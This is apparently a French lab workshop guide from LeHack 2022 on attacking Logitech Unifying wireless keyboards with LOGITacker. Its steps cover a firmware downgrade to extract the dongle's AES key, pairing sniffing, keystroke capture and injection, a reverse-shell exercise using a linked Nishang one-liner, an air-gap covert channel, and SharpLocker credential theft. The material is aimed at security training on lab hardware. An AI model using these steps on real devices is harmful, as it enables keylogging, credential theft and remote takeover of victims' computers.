LeHack 2022 : LOGITacker
===

Ce TP est réalisé sur une **Ubuntu 20.04 LTS**

* https://cloud-images.ubuntu.com/focal/current/

Et Windows au besoin

* https://github.com/magnetikonline/linux-microsoft-ie-virtual-machines


> Les OVA sont disponibles via clé USB
> Identifiants sur Ubuntu : lehack / lehackpass1234!
> 
> md5sum:
> c9d5b88fc745074d474325733bc6548f  kali-linux-2022.2-virtualbox-amd64.ova
> 791cce2fd0ae19c54a319b09ffe56bcc  Ubuntu.ova
> 0c1979bc1876e1649696fe4a082c8948  Windows.ova

> Matériel : 
> Logitech K400 Plus
> Dongle Unifying
> Dongle nrf52840


Récupération de LOGITacker et compilation pour support du layout FR
--

Obectif:

> Installer l'environnement de développement afin de pouvoir compiler le **firmware LOGITacker** à flasher sur le **dongle nrf52840**


Installation du **Arm Gnu Toolchain**

```
$ sudo apt update
$ sudo apt install gcc-arm-none-eabi
```

Récupération de **LOGITacker**

```
$ sudo apt install git
$ mkdir ~/Workshop ; cd ~/Workshop
$ git clone https://github.com/RoganDawes/LOGITacker
$ cd LOGITacker
```

Récupération du SDK

```
$ wget https://www.nordicsemi.com/-/media/Software-and-other-downloads/SDKs/nRF5/Binaries/nRF5SDK153059ac345.zip && unzip nRF5SDK153059ac345.zip
```

Configuration de la Toolchain dans le SDK

```
$ sed -i "s#^GNU_INSTALL_ROOT.*#GNU_INSTALL_ROOT \?= /usr/bin/#g" nRF5_SDK_15.3.0_59ac345/components/toolchain/gcc/Makefile.posix
```

Configuration du SDK dans le Makefile

```
$ cd pca10059/blank/armgcc
$ sed -i "s#^SDK_ROOT.*#SDK_ROOT := ../../../nRF5_SDK_15.3.0_59ac345/#g" Makefile
```

/!\ Uniquement pour Ubuntu 22.04 /!\:

```
$ sed -i "237i\LDFLAGS += -z muldefs \n " Makefile 
```

Compilation du firmware **logitacker_pca10059.hex**
```
$ make
$ cd _build
$ ls -lrt logitacker_pca10059.hex
```

Installation des rules pour le dongle nrf52840
--

* https://github.com/NordicSemiconductor/nrf-udev

/!\ Ne pas installer le .deb via dpkg sur la VM ubuntu 20.04 /!\ Cela casse apt /!\

```
$ cd ~/Workshop
$ wget https://github.com/NordicSemiconductor/nrf-udev/releases/download/v1.0.1/nrf-udev_1.0.1-all.deb
$ ar x nrf-udev_1.0.1-all.deb
$ unxz data.tar.xz 
$ tar xvf data.tar
$ sudo cp -rp lib/udev/rules.d/71-nrf.rules /etc/udev/rules.d/
$ reboot
```

Installation du Programmer Nordic 
--

```
$ sudo apt install fuse
$ mkdir -p ~/Workshop/AppImage
$ cd ~/Workshop/AppImage
$ wget https://github.com/NordicSemiconductor/pc-nrfconnect-core/releases/download/v3.11.0/nrfconnect-3.11.0-x86_64.AppImage
$ chmod +x nrfconnect-3.11.0-x86_64.AppImage
$ ./nrfconnect-3.11.0-x86_64.AppImage
```

Faire la mise à jour, Installer le Programmer et le lancer, plugger le dongle Nordic et charger le fichier **logitacker_pca10059.hex** --> write

Accéder à LOGITacker : 
--

* https://github.com/RoganDawes/LOGITacker#31-logitackers-modes-of-operation

Questions:

> que fait la commande **pass_enum** ?
> **activ_enum** ?

```
$ screen /dev/ttyACM0 115200
$ screen -L /dev/ttyACM0 115200
LOGITacker (discover) $ devices
LOGITacker (discover) $ pass_enum <RF-address>
LOGITacker (discover) $ activ_enum <RF-address>
```

Si trop de log, désactivez les

```
$ log disable
$ log status
```


Extraction de la clé depuis le dongle : CVE-2019-13054 / CVE-2019-13055
--

> Extraction de la clé via un accès physique au dongle

* https://github.com/RoganDawes/munifying

Installation de **munifying**

```
$ sudo apt install golang
$ sudo apt-get -y install libusb-1.0-0 libusb-1.0-0-dev
$ cd ~/Workshop
$ git clone https://github.com/RoganDawes/munifying
$ cd munifying/
$ go build
```

```
$ sudo cp -rp ./munifying /usr/bin
$ munifying
```

Extraction de la clé du dongle (dongle du K400Plus, il faut attacher le dongle à la VM Ubuntu 20.04)

```
$ sudo munyfying info
```

La cle n'a pu etre extraite, il faut downgrader le firmware par un firmware vulnérable afin de restaurer l'accès à la clé (regarder les changelog pour identifier une version de firmware vulnéable)

```
$ cd ~/Workshop
$ git clone https://github.com/Logitech/fw_updates
$ cd fw_updates/RQR24/RQR24.07
$ sudo munifying flash -f RQR24.07_B0030.shex
$ sudo munifying info
```

La clé est présente ! :) On sauvegarde les informations.

```
$ sudo munyfying store
$ cat dongle_XX_XX_XX_XX.dat
```

Import de la clé dans LOGITacker

```
LOGITacker (discover) $ devices add
syntax to add a device manually:
    devices add <RF-address> [AES key]
example device no encryption   : devices add de:ad:be:ef:01
example device with encryption : devices add de:ad:be:ef:02 023601e63268c8d37988847af1ae40a1

LOGITacker (discover) $ devices add de:ad:be:ef:02 <la cle extraite avec munifying>
```

Extraction de la clé lors de la phase d'appairage CVE-2019-13052 (à réaliser en binôme)
--

Exercice :

> Extraction de la clé lors de la phase d'appairage

* https://www.logitech.com/en-us/software/options.html
* https://github.com/RoganDawes/LOGITacker#34-encrypted-injection
* https://doc.ubuntu-fr.org/solaar

Simuler des phases d'appairage avec **LOGIOptions** / **munifying** / **solaar**, puis extraire la clé de chiffrement avec le module **pair** de LOGITacker

```
$ sudo apt install solaar
$ solaar show
$ solaar &
```

Utiliser la fonctionnalité **pair sniff** de **LOGITacker** pour capturer la clé

```
LOGITacker (discover) $ pair
pair - discover
Options:
  -h, --help  :Show command help.
Subcommands:
  sniff   :Sniff pairing.
  device  :pair or forced pair a device to a dongle
LOGITacker (discover) $ pair sniff
sniff - Sniff pairing.
Options:
  -h, --help  :Show command help.
Subcommands:
  run  :Sniff pairing.
LOGITacker (discover) $ pair sniff run
LOGITacker (sniff pairing) $ 
```

> Une fois la clé compromise, il devient possible de sniffer et déchiffrer  les trames radio, et d'injecter des frappes clavier


Récupération des frappes clavier (à réaliser en binôme)
--

> Utiliser la machine virtuelle Windows comme cible, monter le dongle USB Unifying sur la machine virtuelle

/!\ Activer l'option ***pass-through-keyboard*** implique que la victime utilisant le clavier K400 aura également la main sur le poste de l'attaquant /!\

```
LOGITacker (discover) $ log disable
LOGITacker (discover) $ options passive-enum pass-through-keyboard on
LOGITacker (discover) $ passive_enum <MAC>
```

Injection de frappes (binôme)
--

Rédaction du script HID

* https://github.com/RoganDawes/LOGITacker#33-scripting

```
LOGITacker (discover) $ script press GUI r
LOGITacker (discover) $ script string notepad
LOGITacker (discover) $ script delay 1500
LOGITacker (discover) $ script press RETURN
LOGITacker (discover) $ script delay 1500
LOGITacker (discover) $ script string PoC key stroke injection
LOGITacker (discover) $ script show
```

Selection du layout, du dongle cible et execution

```
LOGITacker (discover) $ options inject language fr
LOGITacker (discover) $ inject target <MAC>
LOGITacker (discover) $ inject execute
```

Exercice : 

> récupérer un reverse shell (sur un vps ou en local si le poste cible est sur le même réseau)

* https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1

Déploiement du covert-channel (AirGap Attack) (à réaliser en binôme)
--

Exercice :

> déployer un cover-channel

```
LOGITacker (discover) $ options inject language fr
LOGITacker (discover) $ covert_channel deploy <MAC>
LOGITacker (discover) $ covert_channel connect <MAC>
```

SharpLocker (à réaliser en binôme)
--

* https://github.com/Pickfordmatt/SharpLocker

Depuis le covert channel, lancer la commande suivante pour récupérer les identifiants de la victime

```
!sharplock
```

Cross-Firmware-Flashing (A titre informationnel, ne pas flasher les dongles !! risque de brick !) 
--

> Ne pas réaliser cette partie, donner à titre informationnel
> Il est possible de multiplier par **8** la vitesse d'injection en réalisant un ***Cross-Firmware-Flashing***

* https://twitter.com/mame82/status/1167808645490446337?lang=en
* https://medium.com/@enesilhaydin/mini-mini-logitech-rubber-ducky-6016c72916eb
* https://github.com/Logitech/fw_updates

On flash le dongle avec le firmware LIGHTSPEED (vitesse d'injection x 8)

```
$ sudo munifying info
$ sudo munifying flash -f RQR39/RQR39.06/RQR39.06_B0040.shex
$ sudo munifying info
$ sudo munifying unpairall
```

Dans LOGITacker, modifier le mode pour injecter 8 fois plus rapidement en ciblant le dongle flashé

```
LOGITacker (discover) $ options global workmode lightspeed
```

On peut appairer le dongle Unifying avec LOGITacker

```
$ munifying pair
```

```
LOGITacker (discover) $ pair device run
```

Fin du module
--
